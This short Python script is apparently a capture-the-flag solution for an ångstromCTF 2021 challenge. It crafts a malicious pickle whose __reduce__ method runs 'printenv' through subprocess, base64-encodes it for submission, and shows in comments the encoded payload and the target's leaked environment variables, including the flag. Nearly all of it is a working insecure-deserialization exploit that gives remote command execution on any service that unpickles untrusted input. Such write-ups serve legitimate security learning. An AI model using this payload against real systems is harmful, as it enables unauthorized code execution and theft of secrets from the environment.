import pickle, subprocess, base64, hmac, requests, sys

class getpasswd(object):
    def __reduce__(self):
        return (subprocess.check_output, (('printenv'),))

items = [getpasswd()]

#print(items)

p = pickle.dumps(items)
msg = base64.b64encode(p)
print(msg)

# gANdcQBjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcQFYCAAAAHByaW50ZW52cQKFcQNScQRhLg==
# b'VIRTUAL_HOST=jar.2021.chall.actf.co\nHOSTNAME=024347af30be\nPYTHON_PIP_VERSION=21.0.1\nHOME=/nonexistent\nGPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/29f37dbe6b3842ccd52d61816a3044173962ebeb/public/get-pip.py\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLANG=C.UTF-8\nPYTHON_VERSION=3.9.3\nPWD=/srv\nPYTHON_GET_PIP_SHA256=e03eb8a33d3b441ff484c56a436ff10680479d4bd14e59268e67977ed40904de\nFLAG=actf{you_got_yourself_out_of_a_pickle}\n'